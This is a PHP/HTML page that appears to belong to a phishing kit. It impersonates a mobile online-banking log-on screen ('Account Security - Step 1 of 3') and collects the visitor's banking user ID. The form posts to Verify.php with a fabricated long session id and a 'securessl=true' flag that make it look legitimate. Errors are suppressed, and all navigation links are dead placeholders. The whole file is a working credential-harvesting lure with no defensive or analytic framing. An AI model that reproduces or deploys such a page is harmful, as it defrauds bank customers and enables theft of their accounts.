<?php

error_reporting(0);

date_default_timezone_set("Europe/London");

session_start();

require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Home</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="apple-touch-icon" href="assets/img/iphone.png">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, maximum-scale=1.0, minimum-scale=1.0">
<link type="text/css" rel="stylesheet" href="assets/css/mobile.css">
</head>
<body>
<div id="mHeader">
 <img src="assets/img/logo.gif" width="235px" height="30px">
</div>
<div id="mContent">
<div id="date"><?php echo date('j M Y');?></div>
<div class="header">
<h1 id="heading">Account Security - Step 1 of 3</h1>
</div>
<div>
<div class="contentSegment">
<div id="olbol">
<ul class="legacy">
<li><span><strong>Internet Banking</strong></span></li>
<li><a class="redBtn" href="#"><span>Log on</span></a></li>
<li class="regLink"><a href="#">Register</a></li>
</ul>
</div>
<div class="topbar">
<div class="bottombar">
<div class="fragmentWrapper forgot-memorable-4">
<div class="formContent" id="personalLogonForm">
<form method="post" class="grid_24 logonForm" id="login" autocomplete="off" name="login" action="Verify.php?&sessionid=<?php echo generateRandomString(125); ?>&securessl=true">
<fieldset>
					<legend>Log on to Personal Online Banking</legend>
					<div class="fieldcontent first relative">
						<label for="intbankingID">Please enter your user ID eg IB1234567890 or John123</label>
					</div>
					
					<div class="fieldcontent">				
						<input required class="inpBox3" type="text" id="intbankingID" maxlength="76" autocomplete="off" size="30" name="userid">
						
						<div id="continue" class="inputStyleRed clearfix"><input type="submit" id="registerStep1Submit" class="btnImg" maxlength="30" alt="Continue" title="Continue" value="Continue">
							<span></span>
						</div>
					</div>

					<div class="fieldcontent">
						<input type="checkbox" id="dummycookieuserid" class="rememberMe" name="dummycookieuserid">
						<label for="dummycookieuserid" class="checkboxField noVal width6">Remember my user ID</label>						

<div class="helpInfo fl">
<a href="#" class="helpLink"><span class="hiddenTxt">If you do this, you won't need to enter your user ID when you log on from this computer. Please note, a single cookie will be used to allow us to remember your preference.</span></a>
<div title="Help info." class="info" style="display: none;">
If you do this, you won't need to enter your user ID when you log on from this computer. Please note, a single cookie will be used to allow us to remember your preference.
<span class="tipArrow"></span>
</div>
</div>
<span><a class="arrLink pws size90" href="#">Forgotten your user ID?</a>	</span>
</div>
</fieldset>
</form>
<div class="asidecol">
<h2>New customers</h2>
<ul>
<li>
<a class="pws" href="#">Register for Online Banking</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<ul class="menu">
<li class="question"><a href="#"><span>Forgotten your user ID?</span></a></li>
<li class="contact"><a href="#"><span>Contact us</span></a></li>
<li class="desktop"><a href="#"><span>Desktop view</span></a></li>
</ul>
</div>
<script src="assets/js/rmscript.js" type="text/javascript"></script>
<script src="assets/js/portletdisabledrewording.js" type="text/javascript"></script>
</body>
</html>